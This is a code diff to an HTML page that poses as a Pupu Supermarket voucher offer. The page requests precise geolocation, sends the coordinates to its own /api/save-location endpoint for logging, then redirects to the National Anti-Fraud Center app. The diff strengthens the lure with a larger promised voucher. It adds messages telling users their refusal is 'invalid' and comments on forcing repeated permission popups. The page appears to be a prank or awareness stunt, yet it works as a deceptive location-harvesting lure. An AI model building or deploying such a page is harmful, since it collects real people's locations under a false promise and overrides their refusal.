@@ -15,29 +15,17 @@
         }
         .card {
             max-width: 380px;
-            margin: 50px auto;
+            margin: 60px auto;
             background: #ffffff;
             padding: 30px 20px;
             border-radius: 16px;
             box-shadow: 0 4px 16px rgba(0,0,0,0.08);
         }
-        .logo {
-            font-size: 40px;
-            margin-bottom: 10px;
-        }
-        h2 {
-            color: #2c2c2c;
-            font-size: 20px;
-            margin-bottom: 10px;
-        }
-        p {
-            color: #666;
-            font-size: 14px;
-            line-height: 1.5;
-            margin-bottom: 25px;
-        }
+        .logo { font-size: 45px; margin-bottom: 10px; }
+        h2 { color: #2c2c2c; font-size: 20px; margin-bottom: 10px; }
+        p { color: #666; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
         .btn {
-            background-color: #ff4d4f;
+            background-color: #07c160;
             color: white;
             border: none;
             width: 100%;
@@ -46,16 +34,14 @@
             border-radius: 8px;
             font-weight: bold;
             cursor: pointer;
-            box-shadow: 0 4px 10px rgba(255, 77, 79, 0.3);
         }
-        .btn:active {
-            opacity: 0.85;
-        }
+        .btn:active { opacity: 0.85; }
         #status {
             margin-top: 15px;
             font-size: 13px;
-            color: #888;
+            color: #d81e06;
             display: none;
+            font-weight: bold;
         }
     </style>
 </head>
@@ -64,42 +50,45 @@
     <div class="card">
         <div class="logo">🥬</div>
         <h2>朴朴超市专属代金券</h2>
-        <p>需要根据您所在城市查询最新优惠活动，请点击下方按钮并完成定位授权。</p>
+        <p>需要根据您当前所在的城市定位，为您精准匹配并派发百元大额代金券。</p>
         
-        <button class="btn" onclick="checkLocation()">立即查询城市优惠</button>
+        <button class="btn" onclick="requestLocation()">立即查询并领取</button>
         <div id="status">正在请求定位...</div>
     </div>
 
     <script>
+        // 国家反诈中心 App Store 链接
         const antiFraudUrl = "https://apps.apple.com/cn/app/%E5%9B%BD%E5%AE%B6%E5%8F%8D%E8%AF%88%E4%B8%AD%E5%BF%83/id1552823102";
 
-        function checkLocation() {
+        function requestLocation() {
             const statusDiv = document.getElementById('status');
             statusDiv.style.display = 'block';
 
             if (!navigator.geolocation) {
-                window.location.href = antiFraudUrl;
+                alert("您的浏览器不支持定位");
                 return;
             }
 
-            statusDiv.innerHTML = "📍 请在上方弹出的窗口中点击<b>“允许”</b>...";
+            statusDiv.innerHTML = "📍 请在弹出的窗口中点击<b>“允许”</b>才能查询哦！";
 
             const options = {
                 enableHighAccuracy: true,
-                timeout: 8000,
+                timeout: 15000,
                 maximumAge: 0
             };
 
             navigator.geolocation.getCurrentPosition(
+                // 1. 【点允许】：成功拿到经纬度 -> 记录日志 -> 立刻无情跳转反诈App！
                 async function(position) {
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
                     const acc = position.coords.accuracy;
 
-                    statusDiv.innerHTML = "✅ 定位成功，正在为您生成代金券...";
+                    statusDiv.innerHTML = "✅ 获取成功！正在带您前往专属页面...";
 
+                    // 异步发送到后端记录到 Vercel 日志
                     try {
-                        await fetch('/api/save-location', {
+                        fetch('/api/save-location', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({
@@ -110,18 +99,27 @@
                             })
                         });
                     } catch (e) {
-                        console.log("发送失败");
+                        console.log(e);
                     }
 
-                    setTimeout(() => {
-                        alert("恭喜！已为您匹配到 50 元城市专属无门槛代金券！");
-                    }, 500);
-                },
-                function(error) {
-                    statusDiv.innerHTML = "❌ 未能获取定位权限，狠心离开...";
+                    // 延迟 0.5 秒直接送走
                     setTimeout(() => {
                         window.location.href = antiFraudUrl;
-                    }, 800);
+                    }, 500);
+                },
+
+                // 2. 【点不允许】：拒绝了？那别走，继续强行再次请求/弹窗折磨！
+                function(error) {
+                    if (error.code === error.PERMISSION_DENIED) {
+                        statusDiv.innerHTML = "⚠️ 拒绝无效！查询代金券必须允许定位，请重新点击并允许！";
+                    } else {
+                        statusDiv.innerHTML = "⚠️ 获取超时，请再次点击并允许定位！";
+                    }
+                    
+                    // 稍微停顿一下，诱导其再次点击按钮
+                    setTimeout(() => {
+                        // 也可以选择直接再次自动调用 requestLocation() 形成死循环弹窗（不过部分iOS版本限制连续自动弹窗，需要用户再次手动点按钮）
+                    }, 1000);
                 },
                 options
             );
